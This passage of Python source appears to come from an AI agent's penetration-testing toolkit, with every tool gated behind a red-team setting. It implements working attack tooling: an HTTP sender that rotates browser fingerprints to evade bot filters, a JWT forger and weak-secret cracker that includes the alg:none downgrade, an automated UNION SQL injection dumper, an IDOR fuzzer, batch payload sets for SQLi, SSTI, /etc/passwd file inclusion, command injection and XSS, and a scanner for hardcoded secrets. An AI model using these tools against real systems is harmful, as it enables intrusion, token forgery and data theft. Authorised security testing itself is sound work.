        lines.append(f"{k}: {v}")
    if req_body:
        lines.append("")
        lines.append(req_body if isinstance(req_body, str) else req_body.decode("utf-8", "replace"))
    lines += ["", "### RESPONSE", f"HTTP {status}"]
    for k, v in (resp_headers or {}).items():
        lines.append(f"{k}: {v}")
    lines += ["", resp_body or ""]
    transcript = "\n".join(lines)
    try:
        path.write_text(transcript, encoding="utf-8")
    except Exception:
        return None
    return {"evidence_saved": str(path),
            "evidence_sha256": hashlib.sha256(transcript.encode("utf-8", "replace")).hexdigest()}


def tool_http_request(args: dict) -> dict:
    """AUTHORIZED PENTEST. Send an arbitrary HTTP request (method, url, headers,
    cookies, body) and return status + headers + body. This is the standard
    pentest primitive — the curl / Burp Repeater equivalent — that lets the
    "find a way in" flow chain real exploit steps the read-only recon tools
    cannot: decode+flip+re-encode a session cookie, aim an SSRF url parameter,
    POST an SSTI payload, replay a request with a tampered header.

    It wears a real, rotating browser fingerprint (from the same profile pool as
    the rest of the suite) so it blends in and gets past bot filters. Crucially
    it returns the FULL response — status, ALL response headers (every Set-Cookie
    preserved), and body — because reading a Set-Cookie, a redirect Location, or
    a 500 stack trace is usually the whole point of a finding. Non-2xx responses
    are returned immediately, not retried: unlike a scraper, an exploitation tool
    must SEE a 401/403/404/405 (they are the signal), so we only rotate-and-retry
    on transient blocks (429/503) and connection errors. The identity used is
    returned so the model and the logs can see what it looked like on the wire.
    Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    url = (args.get("url") or args.get("target") or "").strip()
    if not url:
        return {"error": "url required"}
    # Range/internal targets are plain HTTP; default to http:// when no scheme
    # is given (recon tools default to https, which is wrong for a local range).
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    headers: dict = {}
    for k, v in (args.get("headers") or {}).items():
        headers[str(k)] = str(v)
    # Optional cookie jar: when a `session` name is given, we merge previously
    # captured cookies for that session (explicit `cookies` still win) and, on
    # the way back, remember any Set-Cookie the server sends. Opt-in so the
    # default stays explicit and the deliberate cookie-tamper step is never
    # auto-hidden.
    session = args.get("session")
    cookies = dict(args.get("cookies") or {})
    if session:
        merged = dict(_HTTP_SESSIONS.get(str(session), {}))
        merged.update(cookies)  # explicit cookies override the jar
        cookies = merged
    if cookies and not any(k.lower() == "cookie" for k in headers):
        headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

    body = args.get("body")
    if isinstance(body, (dict, list)):
        body = json.dumps(body, ensure_ascii=False)
        headers.setdefault("Content-Type", "application/json")
    data = body.encode("utf-8") if isinstance(body, str) and body else None
    # Method defaults to POST when a body is present, else GET.
    method = (args.get("method") or ("POST" if data else "GET")).upper()
    # A raw body with no content type is almost always form-encoded here.
    if data and not any(k.lower() == "content-type" for k in headers):
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    timeout = max(2.0, min(float(args.get("timeout") or 15.0), 30.0))

    def _headers_of(msg) -> tuple[dict, list]:
        """Response headers as a dict, plus the FULL list of Set-Cookie values
        kept separately (a dict would collapse multiple Set-Cookie headers into
        one, and the session cookie is exactly what a cookie-tamper finding
        needs)."""
        hdrs = {k: v for k, v in msg.items()}
        return hdrs, (msg.get_all("Set-Cookie") or [])

    def _absorb_cookies(set_cookie_list) -> None:
        """Fold response Set-Cookie values into the named session jar (opt-in)."""
        if not session:
            return
        jar = _HTTP_SESSIONS.setdefault(str(session), {})
        for sc in set_cookie_list or []:
            nv = sc.split(";", 1)[0].strip()
            if "=" in nv:
                cn, cv = nv.split("=", 1)
                jar[cn.strip()] = cv.strip()

    # Browser-identity rotation for evasion, but we capture the RESPONSE HEADERS
    # ourselves (the shared _open_with_rotation drops them). Retry only transient
    # blocks; every other status is returned so the model can read it.
    host = ""
    try:
        host = urllib.parse.urlparse(url).netloc
    except Exception:
        pass
    tried: list = []
    last_exc: Exception | None = None
    attempts = 3
    for attempt in range(attempts):
        profile = _pick_profile(host, exclude=tried[-1] if tried else None)
        tried.append(profile)
        req_headers = _browser_headers(profile, accept_html=True)
        req_headers.update(headers)  # caller-supplied headers/cookies win
        try:
            req = urllib.request.Request(url, data=data, method=method, headers=req_headers)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = getattr(resp, "status", 200) or 200
                resp_headers, set_cookie = _headers_of(resp.headers)
                raw = resp.read(1024 * 1024)
                final_url = resp.geturl()
            resp_body_text = raw.decode("utf-8", "replace")
            _absorb_cookies(set_cookie)
            result = {
                "ok": True, "status": status, "method": method, "url": url,
                "final_url": final_url,
                "content_type": resp_headers.get("Content-Type", ""),
                "headers": resp_headers,
                "set_cookie": set_cookie,  # every Set-Cookie the server sent
                "body": resp_body_text,
                "user_agent": profile.get("ua", ""),  # identity we blended in as
            }
            if session:
                result["session_cookies"] = dict(_HTTP_SESSIONS.get(str(session), {}))
            if args.get("save_evidence"):
                ev = _save_http_request_evidence(
                    args.get("evidence_label") or args.get("save_evidence"),
                    method, url, req_headers, data, status, resp_headers, resp_body_text)
                if ev:
                    result.update(ev)
            return result
        except urllib.error.HTTPError as e:
            resp_headers, set_cookie = _headers_of(e.headers)
            try:
                body_txt = e.read().decode("utf-8", "replace")
            except Exception:
                body_txt = ""
            # Only 429/503 are worth rotating past; 401/403/404/405/5xx are the
            # finding itself and are returned immediately.
            if e.code in (429, 503) and attempt < attempts - 1:
                last_exc = e
                time.sleep(0.4 + random.random() * 0.6)
                continue
            _absorb_cookies(set_cookie)  # a 302 login still sets cookies
            result = {
                "ok": False, "status": e.code, "method": method, "url": url,
                "content_type": resp_headers.get("Content-Type", ""),
                "headers": resp_headers,
                "set_cookie": set_cookie,
                "body": body_txt,
                "user_agent": profile.get("ua", ""),
                "note": f"HTTP {e.code}",
            }
            if session:
                result["session_cookies"] = dict(_HTTP_SESSIONS.get(str(session), {}))
            if args.get("save_evidence"):
                ev = _save_http_request_evidence(
                    args.get("evidence_label") or args.get("save_evidence"),
                    method, url, req_headers, data, status, resp_headers, body_txt)
                if ev:
                    result.update(ev)
            return result
        except Exception as e:
            # Connection-level failure (DNS, timeout, reset): retry with a fresh
            # identity, then give up.
            last_exc = e
            time.sleep(0.3 + random.random() * 0.4)
            continue
    return {"error": f"request failed: {last_exc}", "url": url, "method": method}


def tool_encode_decode(args: dict) -> dict:
    """AUTHORIZED PENTEST. Encode or decode a string with the common web-app
    schemes — base64 / base64url, URL percent-encoding, hex, and JWT segment
    decode. This is the Burp "Decoder" equivalent: it lets the model inspect and
    FORGE tokens (decode an unsigned session cookie, flip a field, re-encode it)
    without doing base64 by hand — the mechanical step that otherwise walls small
    models even when they understand the vulnerability. Pure string transform, no
    I/O. Gated behind red_team_enabled.

    args: text (the string), scheme (base64|base64url|url|hex|jwt, default
    base64), operation (encode|decode, default encode). base64 encode returns
    BOTH the standard and url-safe alphabets so the caller can match whatever the
    app expects (unsigned cookies commonly use url-safe)."""
    # Module aliases the stdlib as `_b64` (import base64 as _b64), so a bare
    # `base64.` name isn't bound here — import it locally, as other tools do.
    import base64
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    text = args.get("text")
    if text is None:
        text = args.get("input") or args.get("value") or args.get("data") or ""
    if not isinstance(text, str):
        # A model may hand us a dict/list to encode (e.g. a forged cookie payload).
        text = json.dumps(text, ensure_ascii=False, separators=(",", ":"))

    scheme = (args.get("scheme") or args.get("format") or "base64").lower().strip()
    op = (args.get("operation") or args.get("op") or "encode").lower().strip()
    # Forgive the common synonyms small models invent.
    scheme = {"b64": "base64", "base-64": "base64", "b64url": "base64url",
              "base64-url": "base64url", "urlsafe": "base64url", "percent": "url",
              "urlencode": "url", "url-encode": "url", "urlencoded": "url"}.get(scheme, scheme)
    op = {"enc": "encode", "dec": "decode"}.get(op, op)

    def _b64_decode(s: str) -> str:
        # Accept either alphabet and tolerate stripped padding/whitespace.
        s2 = "".join(s.split()).replace("-", "+").replace("_", "/")
        return base64.b64decode(s2 + "=" * (-len(s2) % 4)).decode("utf-8", "replace")

    try:
        if scheme in ("base64", "base64url"):
            if op == "decode":
                return {"scheme": scheme, "operation": "decode", "result": _b64_decode(text)}
            raw = text.encode("utf-8")
            std = base64.b64encode(raw).decode("ascii")
            urlsafe = base64.urlsafe_b64encode(raw).decode("ascii")
            return {"scheme": scheme, "operation": "encode",
                    "result": urlsafe if scheme == "base64url" else std,
                    "base64": std, "base64url": urlsafe}
        if scheme == "url":
            if op == "decode":
                return {"scheme": "url", "operation": "decode", "result": urllib.parse.unquote(text)}
            return {"scheme": "url", "operation": "encode", "result": urllib.parse.quote(text, safe="")}
        if scheme == "hex":
            if op == "decode":
                return {"scheme": "hex", "operation": "decode",
                        "result": bytes.fromhex("".join(text.split())).decode("utf-8", "replace")}
            return {"scheme": "hex", "operation": "encode", "result": text.encode("utf-8").hex()}
        if scheme == "jwt":
            # Always a decode: split header.payload.signature and decode the two
            # base64url JSON segments. Signature is shown but NOT verified — the
            # point is to inspect/forge, not validate.
            parts = text.strip().split(".")
            if len(parts) < 2:
                return {"error": "not a JWT — expected header.payload.signature"}

            def _seg(seg: str):
                return json.loads(base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)).decode("utf-8", "replace"))

            return {"scheme": "jwt", "operation": "decode",
                    "header": _seg(parts[0]), "payload": _seg(parts[1]),
                    "signature": parts[2] if len(parts) > 2 else "",
                    "note": "signature NOT verified — inspect/forge only"}
        return {"error": f"unknown scheme '{scheme}' — use base64, base64url, url, hex, or jwt"}
    except Exception as e:
        return {"error": f"{scheme} {op} failed: {e}", "input_preview": text[:120]}


# Common weak HMAC secrets tried by the jwt_tool cracker. Small on purpose - a
# real crack uses a big wordlist via the `wordlist` arg; this catches the
# embarrassing-but-common defaults instantly.
_JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt", "token", "changeme",
    "secretkey", "secret123", "s3cr3t", "test", "root", "qwerty", "letmein",
    "your-256-bit-secret", "your_jwt_secret", "supersecret", "private",
    "jwtsecret", "mysecret", "default", "hmac", "signature", "",
]


def tool_jwt_tool(args: dict) -> dict:
    """AUTHORIZED PENTEST. Decode, forge (sign), or crack a JSON Web Token - the
    bread-and-butter of modern auth attacks. Operations:
      decode : split + base64url-decode header & payload (no verification).
      sign   : build a signed token from `payload` (JSON object) with `secret`
               and `alg` (HS256|HS384|HS512|none). alg=none produces an unsigned
               token for the classic alg-confusion downgrade.
      crack  : brute a token's HMAC `secret` against a built-in weak list plus
               your optional `wordlist`. On a hit, forge with operation=sign.
    Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    import base64
    import hashlib
    import hmac as _hmac

    op = (args.get("operation") or args.get("op") or "decode").lower().strip()
    algs = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

    def b64url_enc(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")

    def b64url_dec(s: str) -> bytes:
        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

    try:
        if op == "decode":
            token = (args.get("token") or args.get("text") or "").strip()
            parts = token.split(".")
            if len(parts) < 2:
                return {"error": "not a JWT — expected header.payload.signature"}
            return {"operation": "decode",
                    "header": json.loads(b64url_dec(parts[0])),
                    "payload": json.loads(b64url_dec(parts[1])),
                    "signature": parts[2] if len(parts) > 2 else "",
                    "note": "signature NOT verified — inspect/forge only"}

        if op in ("sign", "encode", "forge"):
            payload = args.get("payload")
            if isinstance(payload, str):
                try:
                    payload = json.loads(payload)
                except Exception:
                    return {"error": "payload must be a JSON object (e.g. {\"user\":\"admin\"})"}
            if not isinstance(payload, dict):
                return {"error": "payload (a JSON object) is required to sign"}
            alg = (args.get("alg") or "HS256").upper()
            # alg:none must be encoded canonically lowercase, or servers that do
            # the classic downgrade check (alg == "none") won't accept it.
            header_alg = "none" if alg == "NONE" else alg
            header = args.get("header") or {}
            if isinstance(header, str):
                try:
                    header = json.loads(header)
                except Exception:
                    header = {}
            header.setdefault("alg", header_alg)
            header.setdefault("typ", "JWT")
            signing_input = (b64url_enc(json.dumps(header, separators=(",", ":")).encode()) + "." +
                             b64url_enc(json.dumps(payload, separators=(",", ":")).encode()))
            if alg == "NONE":
                return {"operation": "sign", "alg": "none", "token": signing_input + ".",
                        "note": "unsigned (alg:none) token — works only against servers that accept it"}
            if alg not in algs:
                return {"error": f"unsupported alg '{alg}' — use HS256, HS384, HS512, or none"}
            secret = args.get("secret")
            if secret is None:
                return {"error": "secret required to HMAC-sign (or use alg=none)"}
            sig = _hmac.new(str(secret).encode(), signing_input.encode(), algs[alg]).digest()
            return {"operation": "sign", "alg": alg, "token": signing_input + "." + b64url_enc(sig)}

        if op == "crack":
            token = (args.get("token") or args.get("text") or "").strip()
            parts = token.split(".")
            if len(parts) != 3:
                return {"error": "crack needs a full header.payload.signature token"}
            try:
                header = json.loads(b64url_dec(parts[0]))
            except Exception:
                return {"error": "could not decode token header"}
            alg = (header.get("alg") or "HS256").upper()
            if alg not in algs:
                return {"error": f"crack supports HMAC algs only (token uses '{alg}')"}
            signing_input = (parts[0] + "." + parts[1]).encode()
            want = parts[2]
            wl = list(_JWT_WEAK_SECRETS)
            extra = args.get("wordlist")
            if isinstance(extra, list):
                wl += [str(x) for x in extra]
            elif isinstance(extra, str):
                wl += extra.split()
            for cand in wl:
                sig = b64url_enc(_hmac.new(cand.encode(), signing_input, algs[alg]).digest())
                if _hmac.compare_digest(sig, want):
                    return {"operation": "crack", "found": True, "secret": cand, "alg": alg,
                            "note": "secret recovered — forge with operation=sign, secret=<this>"}
            return {"operation": "crack", "found": False, "tried": len(wl), "alg": alg,
                    "note": "no secret in the tested set — supply a larger `wordlist`"}

        return {"error": f"unknown operation '{op}' — use decode, sign, or crack"}
    except Exception as e:
        return {"error": f"jwt {op} failed: {e}"}


def tool_sql_injection(args: dict) -> dict:
    """AUTHORIZED PENTEST. Semi-automated SQL injection on a GET query parameter
    (sqlmap-lite). Handles the mechanical parts so the model only decides WHAT to
    pull: probes error-based + boolean-based injectability, finds the UNION
    column count automatically, and — if `extract` is given (a SELECT list,
    optionally with FROM, e.g. "flag FROM secrets" or "name FROM sqlite_master
    WHERE type='table'") — builds the padded UNION payload and returns the rows.
    Pass `url` (with the target param) and optionally `param` (defaults to the
    first query param). Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
    if not url or "?" not in url:
        return {"error": "url with a query parameter required, e.g. http://host/search?q=test"}
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 15.0))
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not qs:
        return {"error": "no query parameter to inject"}
    param = args.get("param") or qs[0][0]
    base_val = dict(qs).get(param, "1")

    def send(injection):
        newqs = [(k, (injection if k == param else v)) for k, v in qs]
        u = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(newqs)))
        return _recon_fetch(u, timeout=timeout, max_bytes=20000)

    def looks_error(body):
        bl = (body or "").lower()
        return ("sql error" in bl or "syntax error" in bl or
                "do not have the same number" in bl or
                any(sig in bl for sig in _RECON_SQL_ERRORS))

    result = {"url": url, "param": param}
    # injectability: error-based + boolean-based
    result["error_based"] = looks_error(send(base_val + "'").get("body"))
    t = send(base_val + "' AND '1'='1")
    f = send(base_val + "' AND '1'='2")
    result["boolean_based"] = ((t.get("body") or "") != (f.get("body") or "")
                               and t.get("status") == f.get("status"))
    result["injectable"] = result["error_based"] or result["boolean_based"]

    # UNION column count: pad NULLs until the response is a clean, non-error 200
    ncols = None
    for n in range(1, 13):
        r = send(base_val + "' UNION SELECT " + ",".join(["NULL"] * n) + "-- ")
        if r.get("status") == 200 and not looks_error(r.get("body")):
            ncols = n
            break
    result["union_columns"] = ncols

    extract = (args.get("extract") or "").strip()
    if extract:
        if ncols is None:
            result["note"] = ("couldn't fix UNION column count — extract manually via http_request "
                              "(boolean/blind), or check the parameter is really UNION-injectable.")
            return result
        m = re.split(r"\s+from\s+", extract, maxsplit=1, flags=re.IGNORECASE)
        select_part = m[0].strip()
        from_part = (" FROM " + m[1].strip()) if len(m) > 1 else ""
        pad = ",NULL" * max(0, ncols - (select_part.count(",") + 1))
        payload = base_val + f"' UNION SELECT {select_part}{pad}{from_part}-- "
        r = send(payload)
        result.update({"payload": payload, "dump_status": r.get("status"),
                       "dump_body": r.get("body", ""),
                       "note": "extracted rows are in dump_body — the injected values are the ones "
                               "absent from a normal query's results."})
    else:
        result["note"] = ("injectable — pass `extract` (e.g. 'flag FROM secrets', or enumerate schema "
                          "with 'name FROM sqlite_master') to dump."
                          if result["injectable"] else "no clear injection on this parameter.")
    return result


def tool_fuzz(args: dict) -> dict:
    """AUTHORIZED PENTEST. Iterate a request parameter over many values and report
    which responses DIFFER from the norm — the primitive for enumeration/IDOR
    (find the one object id that leaks), parameter/endpoint brute forcing, and
    access checks. Put FUZZ in the url where the value goes, OR pass `param`;
    supply `values` (list) or `range`=[start,end] (integers). Returns the outlier
    responses (status/size differ from the common baseline) so the interesting
    one is obvious. Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
    if not url:
        return {"error": "url required"}
    param = args.get("param")
    if "FUZZ" not in url and not param:
        return {"error": "put FUZZ in the url where the value goes, or pass `param`"}
    values = args.get("values")
    rng = args.get("range")
    if not values and isinstance(rng, list) and len(rng) == 2:
        try:
            values = [str(i) for i in range(int(rng[0]), int(rng[1]) + 1)]
        except Exception:
            return {"error": "range must be [start, end] integers"}
    if not values:
        return {"error": "provide `values` (list) or `range` [start, end]"}
    values = [str(v) for v in values][:300]
    timeout = max(2.0, min(float(args.get("timeout") or 6.0), 12.0))

    def build(v):
        if "FUZZ" in url:
            return url.replace("FUZZ", urllib.parse.quote(v, safe=""))
        p = urllib.parse.urlparse(url)
        q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
        q = ([(k, (v if k == param else vv)) for k, vv in q]
             if any(k == param for k, _ in q) else q + [(param, v)])
        return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q)))

    def probe(v):
        r = _recon_fetch(build(v), timeout=timeout, max_bytes=4000)
        body = r.get("body", "") or ""
        return {"value": v, "status": r.get("status"), "size": len(body),
                "snippet": body[:140].replace("\n", " ")}

    from collections import Counter
    with ThreadPoolExecutor(max_workers=6, thread_name_prefix="fuzz") as ex:
        results = list(ex.map(probe, values))
    counts = Counter((r["status"], r["size"]) for r in results)
    modal = counts.most_common(1)[0][0] if counts else None
    distinct = [r for r in results if (r["status"], r["size"]) != modal]
    return {"url": url, "tested": len(results),
            "modal_response": ({"status": modal[0], "size": modal[1]} if modal else None),
            "distinct_count": len(distinct), "distinct": distinct[:50],
            "note": "the distinct responses differ from the common baseline — the outliers are "
                    "where the interesting data (another user's object, a valid id) lives."}


def tool_validate_finding(args: dict) -> dict:
    """AUTHORIZED PENTEST. Sanity-check a suspected finding BEFORE reporting it, to
    avoid false positives on decoys / catch-all pages / WAF blocks. Fetches the
    url, diffs it against a random-path baseline, classifies the response, and
    flags placeholder/decoy markers (example.invalid, 'placeholder', 'nothing
    sensitive', lorem ipsum, …). Returns likely_real + reasons so you don't
    report a honeypot. Read-only. Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
    if not url:
        return {"error": "url required"}
    timeout = max(2.0, min(float(args.get("timeout") or 7.0), 15.0))
    parsed = urllib.parse.urlparse(url)
    baseline = _recon_baseline(f"{parsed.scheme}://{parsed.netloc}/", timeout)
    r = _recon_fetch(url, timeout=timeout, max_bytes=8000)
    if "error" in r:
        return {"url": url, "likely_real": False, "reasons": [f"request failed: {r['error']}"]}
    body = r.get("body", "") or ""
    cls = _recon_classify_body(r.get("status"), r.get("headers"), body)
    reasons, likely_real = [], True
    if r.get("status") != 200:
        reasons.append(f"status {r.get('status')} (not 200)"); likely_real = False
    if _recon_same_as_baseline(r, baseline):
        reasons.append("identical to the catch-all baseline (not a distinct resource)"); likely_real = False
    if cls == "waf_challenge":
        reasons.append("response is a WAF/block page"); likely_real = False
    markers = ["example.invalid", "example.com", "placeholder", "changeme", "lorem ipsum",
               "nothing sensitive", "do not use", "dummy", "sample data", "not a real", "test data"]
    hit = [m for m in markers if m in body.lower()]
    if hit:
        reasons.append(f"contains placeholder/decoy markers: {hit}"); likely_real = False
    if likely_real:
        reasons.append("distinct 200 resource, not a catch-all/WAF, no placeholder markers")
    return {"url": url, "status": r.get("status"), "classification": cls,
            "likely_real": likely_real, "reasons": reasons, "snippet": body[:200],
            "note": "likely_real=false → treat with suspicion (decoy/catch-all/block); do NOT report "
                    "it as a finding without stronger proof."}


# Built-in payload sets per vuln class for batch_probe. Distinctive markers so a
# hit means execution/read, not mere reflection (e.g. 31337*2 = 62674).
_BATCH_PROBE_SETS = {
    "sqli": ["'", "1' OR '1'='1", "1\" OR \"1\"=\"1"],
    "ssti": ["{{1337*1337}}", "${1337*1337}", "<%= 1337*1337 %>"],
    "lfi":  ["../../../../../../etc/passwd", "....//....//....//etc/passwd"],
    "cmdi": [";echo $((31337*2))", "|echo $((31337*2))", "`echo $((31337*2))`"],
    "xss":  ["<svg/onload=1>"],
}


def tool_batch_probe(args: dict) -> dict:
    """AUTHORIZED PENTEST. Fire a payload set at EVERY parameter of MANY endpoints
    in one call — the "try this against every parameterized endpoint" primitive,
    so you don't hand-craft N×M http_request calls. Give `targets` (a list of URLs
    that carry query params) and either `probe` (a built-in class: sqli | ssti |
    lfi | cmdi | xss) or your own `payloads` list. For each target × param ×
    payload it sends the request and flags hits (SQL error / template-eval /
    /etc/passwd read / shell-exec / reflection signatures — or, for custom
    payloads, responses that differ from the parameter's baseline). Follow a hit
    up with sql_injection (dump), http_request (exploit), or fuzz (enumerate).
    Read-only per request. Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    targets = args.get("targets") or args.get("urls") or args.get("url")
    if isinstance(targets, str):
        targets = [targets]
    if not targets:
        return {"error": "provide `targets` — a list of URLs that carry query parameters"}
    probe = (args.get("probe") or "").lower().strip()
    payloads = args.get("payloads")
    if isinstance(payloads, str):
        payloads = [payloads]
    if not payloads:
        if probe not in _BATCH_PROBE_SETS:
            return {"error": "provide `probe` (sqli|ssti|lfi|cmdi|xss) or a `payloads` list"}
        payloads = _BATCH_PROBE_SETS[probe]
    timeout = max(2.0, min(float(args.get("timeout") or 6.0), 12.0))

    def detect(body):
        b = body or ""
        bl = b.lower()
        if probe == "sqli":
            # Match the same signatures sql_injection uses, incl. the generic
            # "sql error" / "syntax error" prefixes many apps emit.
            for sig in ("sql error", "syntax error", "unrecognized token",
                        "do not have the same number", *_RECON_SQL_ERRORS):
                if sig in bl:
                    return f"SQL error signature: '{sig}'"
            return None
        if probe == "ssti":
            return "template evaluated (1787569)" if "1787569" in b else None
        if probe == "lfi":
            if re.search(r"root:.*:0:0:", b):
                return "/etc/passwd contents returned"
            return "win.ini returned" if "[fonts]" in bl else None
        if probe == "cmdi":
            return "command executed (shell computed 62674)" if "62674" in b else None
        if probe == "xss":
            return "payload reflected unencoded" if "<svg/onload=1>" in b else None
        return None  # custom payloads → handled via baseline diff below

    # Expand to one job per (url, param).
    jobs = []
    for t in targets:
        u = _recon_prep_url(str(t))
        p = urllib.parse.urlparse(u)
        q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
        for pname, _ in q:
            jobs.append((u, p, q, pname))
    if not jobs:
        return {"error": "no query parameters found in targets — include a ?key=value in each URL"}

    cap = 400  # hard ceiling on total requests
    counter = {"sent": 0}

    def run(job):
        u, p, q, pname = job
        base = None
        if not probe:  # custom payloads: reference the unmodified response
            r0 = _recon_fetch(u, timeout=timeout, max_bytes=6000)
            base = (r0.get("status"), len(r0.get("body") or ""))
        out = []
        for pay in payloads:
            if counter["sent"] >= cap:
                break
            counter["sent"] += 1
            newq = [(k, (pay if k == pname else v)) for k, v in q]
            uu = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(newq)))
            r = _recon_fetch(uu, timeout=timeout, max_bytes=20000)
            body = r.get("body", "")
            ev = detect(body)
            if ev is None and not probe:
                if (r.get("status"), len(body or "")) != base:
                    ev = f"response changed (status {r.get('status')}, {len(body or '')}b vs baseline {base})"
            if ev:
                out.append({"path": p.path, "param": pname, "payload": pay,
                            "status": r.get("status"), "evidence": ev, "test_url": uu})
        return out

    hits = []
    with ThreadPoolExecutor(max_workers=6, thread_name_prefix="batch") as ex:
        for res in ex.map(run, jobs):
            hits.extend(res)

    return {"targets": len(targets), "params_tested": len(jobs), "requests_sent": counter["sent"],
            "probe": probe or "custom", "hit_count": len(hits), "hits": hits,
            "note": ("injectable/interesting endpoints are in hits — follow up with sql_injection "
                     "(dump), http_request (exploit), or fuzz (enumerate).") if hits else
                    "no signatures fired for this payload set across the given endpoints."}


# High-signal secret patterns for scan_js_secrets. Curated to keep false
# positives low; the generic assignment catcher below is looser and flagged as
# needs-verification.
_SECRET_PATTERNS = [
    ("AWS access key id", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("Google API key", re.compile(r"AIza[0-9A-Za-z\-_]{35}")),
    ("Google OAuth token", re.compile(r"ya29\.[0-9A-Za-z\-_]{20,}")),
    ("Slack token", re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,}")),
    ("Slack webhook", re.compile(r"https://hooks\.slack\.com/services/[A-Za-z0-9/_-]+")),
    ("GitHub token", re.compile(r"gh[pousr]_[0-9A-Za-z]{36,}")),
    ("Stripe live secret key", re.compile(r"sk_live_[0-9a-zA-Z]{24,}")),
    ("Stripe live publishable key", re.compile(r"pk_live_[0-9a-zA-Z]{24,}")),
    ("SendGrid API key", re.compile(r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}")),
    ("Twilio API key sid", re.compile(r"SK[0-9a-fA-F]{32}")),
    ("Mailgun key", re.compile(r"key-[0-9a-zA-Z]{32}")),
    ("Firebase database URL", re.compile(r"https://[a-z0-9-]+\.firebaseio\.com")),
    ("Supabase URL", re.compile(r"https://[a-z0-9]+\.supabase\.co")),
    ("JWT", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,}")),
    ("private key block", re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----")),
    ("basic-auth in URL", re.compile(r"https?://[A-Za-z0-9._%+-]+:[^@\s/'\"]{3,}@[A-Za-z0-9.-]+")),
]

# Loose catcher for `apiKey/secret/token/password = "value"` style assignments.
_GENERIC_SECRET_RE = re.compile(
    r"""['"]?(?P<k>[A-Za-z0-9_]*(?:api[_-]?key|secret|token|passwd|password|pwd|access[_-]?key|client[_-]?secret|auth[_-]?token)[A-Za-z0-9_]*)['"]?\s*[:=]\s*['"](?P<v>[A-Za-z0-9\-_./+=]{12,})['"]""",
    re.IGNORECASE)

# Keys commonly PUBLIC by design (client-side) — report but flag as maybe-intended.
_OFTEN_PUBLIC = {"Google API key", "Firebase database URL", "Supabase URL"}


def tool_scan_js_secrets(args: dict) -> dict:
    """AUTHORIZED PENTEST. Fetch a page, pull its inline and linked JavaScript,
    and hunt for hardcoded secrets: cloud keys (AWS / Google / Stripe / Slack /
    GitHub / SendGrid / Twilio / Mailgun), JWTs, Firebase/Supabase endpoints,
    private-key blocks, basic-auth URLs, and generic apiKey/secret/token = "..."
    assignments. This is the "scrape the front-end for keys" primitive. Read-only.
    Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
    if not url:
        return {"error": "url required"}
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 20.0))
    page = _recon_fetch(url, timeout=timeout, max_bytes=600000)
    if "error" in page:
        return {"error": f"fetch failed: {page['error']}", "url": url}
    html = page.get("body", "") or ""
    js_urls = []
    for m in re.finditer(r"<script[^>]+src=[\"']([^\"']+)[\"']", html, re.IGNORECASE):
        js_urls.append(urllib.parse.urljoin(url, m.group(1)))
    js_urls = list(dict.fromkeys(js_urls))[:20]

    sources = [(url + " (html)", html)]

    def fetch_js(ju):
        r = _recon_fetch(ju, timeout=timeout, max_bytes=900000)
        return (ju, r.get("body", "") or "")

    if js_urls:
        with ThreadPoolExecutor(max_workers=6, thread_name_prefix="jssec") as ex:
            for ju, body in ex.map(fetch_js, js_urls):
                if body:
                    sources.append((ju, body))

    findings, seen = [], set()
    for src_label, text in sources:
        for label, rx in _SECRET_PATTERNS:
            for m in rx.finditer(text):
                val = m.group(0)
                if (label, val) in seen:
                    continue
                seen.add((label, val))
                findings.append({"type": label, "match": val[:80], "source": src_label,
                                 "note": "often public by design — verify it actually grants access"
                                         if label in _OFTEN_PUBLIC else ""})
        for m in _GENERIC_SECRET_RE.finditer(text):
            k, v = m.group("k"), m.group("v")
            if ("generic:" + k, v) in seen:
                continue
            seen.add(("generic:" + k, v))
            findings.append({"type": f"hardcoded {k}",
                             "match": (v[:60] + "…") if len(v) > 60 else v, "source": src_label,
                             "note": "generic assignment — verify it is a real secret, not a placeholder"})

    return {"url": url, "js_files_scanned": len(sources) - 1, "finding_count": len(findings),
            "findings": findings[:200],
            "note": ("secrets found — verify each grants access before reporting; some client-side "
